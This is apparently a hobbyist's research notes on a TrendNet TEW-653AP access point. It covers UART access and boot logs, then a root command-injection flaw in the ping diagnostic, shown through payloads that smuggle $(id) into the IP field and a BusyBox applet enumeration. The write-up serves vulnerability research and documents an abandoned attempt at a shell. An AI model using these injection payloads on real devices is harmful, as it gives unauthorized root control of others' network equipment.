# Trendnet
Notes for TrendNet AP


# Locating UART
I found an area on the board that looked like UART, with a multimeter I found what I think is ground, Send and Recieve

# Testing UART
I hooked up my flipper zero and connect like normal, after playing around with different baud rates it seems like to 57600.
```
U-boot Ver:1.0.1.30 2009/10/12


Board: Ralink APSoC DRAM:  32 MB  1*32 MB
============================================ 
ASIC 3052_MP2 (Port5<->None)
Product Name: EAP9550
SDRAM CAS = 3(d1835272) 
============================================ 

Please choose the operation: 
   1: Load system code to SDRAM via TFTP. 

LINUX started...
init started: BusyBox v1.7.5 (2011-06-30 16:53:57 CST)
starting pid 131, tty '/dev/console': '/sbin/config_init'
Config Init version: 1.2.2.98 date: 2011/06/30
starting pid 174, tty '/dev/ttyS1': '/sbin/config_term'
************************************************************************
*                                TEW-653AP                             *
************************************************************************

KernelApp/Ramdisk Ver:1.2.2.98                   Date:2011/06/30
console> cat: can't open '/apps/lib/modules/2.6.21/modulesApp.dep': No such file or directory
ln: /sbin/./apps_init: File exists
sh: cannot create /proc/senao/ip_conntrack_interface: nonexistent directory

```

It seemed like the UART shell was limited. Even though I was looking at a prompt, it didn't respond to common commands:
```
************************************************************************
*                                TEW-653AP                             *
************************************************************************

KernelApp/Ramdisk Ver:1.2.2.98                   Date:2011/06/30
console> help
************************************************************************
*                                TEW-653AP                             *
************************************************************************

KernelApp/Ramdisk Ver:1.2.2.98                   Date:2011/06/30
console> ls
************************************************************************
*                                TEW-653AP                             *
************************************************************************

KernelApp/Ramdisk Ver:1.2.2.98                   Date:2011/06/30
console> ?
************************************************************************
*                                TEW-653AP                             *
************************************************************************

KernelApp/Ramdisk Ver:1.2.2.98                   Date:2011/06/30
console> whoami
************************************************************************
*                                TEW-653AP                             *
************************************************************************
```
I did find an old DD-WRT forum post in which a user suggests you can enter 1,2,4 or 9 at the prompt (2,4 and 9 are hidden options). I tried these options but did not notice any changes:
https://forum.dd-wrt.com/phpBB2/viewtopic.php?t=89254&postdays=0&postorder=asc&start=15

# Command Injection
I noticed on the Tools > Diagnostic menu there was a ping utility, provide an IP address and the AP will attempt to ping the target. This looked like a command injection to me, I played around with it for a bit and was unable to get it to work.

I did notice if I provided a payload such as:
```
192.168.10.10'|id|'
```
Then the AP would continue to ping the target IP, regardless of how many counts were provided. I observed the continous ping in wireshark. This led me to believe there is something interesting happening here.

# UART Logs
While connected to the UART, I continued to test the ping functionality. While providing the following payload:
```
192.168.10.101"$(id)"
```
I noticed the following in the UART console:
```
ping bad address uid=0
```

This confirmed there is in fact a command injection, I can see in the UART console log that the _id_ command did execute. it appears the output from the _id_ command was fed into the ping command.

# Trying for a shell
After confirming the command injection, I wanted to get a shell on the device. I tried many different payloads, but nothing was working and the limited output of the UART console was making it hard to tell what exactly was failing. I thought it would be helpful to know what applets were on this busybox, and if netcat was present at all. So I made a wordlist of all busybox applets from here: https://busybox.net/downloads/BusyBox.html I then used BurpSuite's Intruder to send each applet inside my command injection payload, and logged the UART shell output. I found the following applets installed:
```
cat binaries.txt       
ping: bad address 'sbin/arp'
ping: bad address 'sbin/brctl'
ping: bad address 'sbin/dumpleases'
ping: bad address 'sbin/httpd'
ping: bad address 'sbin/ifconfig'
ping: bad address 'sbin/ifdown'
ping: bad address 'sbin/ifup'
ping: bad address 'sbin/init'
ping: bad address 'sbin/insmod'
ping: bad address 'sbin/lsmod'
ping: bad address 'sbin/modprobe'
ping: bad address 'sbin/reset'
ping: bad address 'sbin/rmmod'
ping: bad address 'sbin/route'
ping: bad address 'sbin/sysctl'
ping: bad address 'sbin/syslogd'
ping: bad address 'sbin/udhcpc'
ping: bad address 'sbin/udhcpd'
ping: bad address 'sbin/vconfig'
ping: bad address 'sbin/wget'
ping: bad address 'bin/ash'
ping: bad address 'bin/ash'
ping: bad address 'bin/cat'
ping: bad address 'bin/chmod'
ping: bad address 'bin/cp'
ping: bad address 'bin/date'
ping: bad address 'bin/df'
ping: bad address 'bin/dmesg'
ping: bad address 'bin/echo'
ping: bad address 'bin/grep'
ping: bad address 'bin/ip'
ping: bad address 'bin/kill'
ping: bad address 'bin/ln'
ping: bad address 'bin/ls'
ping: bad address 'bin/mkdir'
ping: bad address 'bin/mknod'
ping: bad address 'bin/mv'
ping: bad address 'bin/netstat'
ping: bad address 'bin/nice'
ping: bad address 'bin/pidof'
ping: bad address 'bin/ping'
ping: bad address 'bin/ps'
ping: bad address 'bin/pwd'
ping: bad address 'bin/rm'
ping: bad address 'bin/sh'
ping: bad address 'bin/sleep'
ping: bad address 'bin/stty'
ping: bad address 'bin/sync'
ping: bad address 'bin/touch'
ping: bad address 'bin/true'
ping: bad address 'bin/umount'
ping: bad address 'bin/uname'
```
It doesn't look like theres much to work with, and nc missing so any netcat shells won't work.

# Bring my own binary?
I noticed wget is present, and I confirmed it worked by using the command injection to download a txt file from my laptop. So I thought maybe I can just compile a version of netcat for the AP, then use wget to retrieve it.  While looking at the board I noticed there was a piece of metal (a heatsink?) on top of the processor:
pic here

So I thought, I'll just pop that off so I can see specifically what the processor is. I did that and found it was a RaLink (which should have been obvious because I saw Ralink the UART prompt previously):

# Bummer
With the specific model number for the processor I did some research. It's a MIPS processor, and so any binary I compile would need to be MIPS. This led me down a rabbit hole researching cross compiling, and trying to find shells or mips backdoors other people have created. I did find an interesting one here that was created for a trendnet switch: https://osandamalith.com/2015/10/11/how-to-turn-your-switch-into-a-snitch/

I was excited to try this out, I started by compiling a simple hello world binary. I got everything ready and then..... 

The AP no longer powers up. Previously on boot, LEDs would flash, I don't see those anymore. I don't see it broadcasting it's default SSID, and I get nothing on the UART port. When I test with my multimeter, I don't see any voltage coming from the TX pin on the UART.

Womp Womp

I don't know what I did wrong, I didn't think removing the heatsink would break the AP, but I guess it did. That's all for now, maybe I can find another AP in the future.

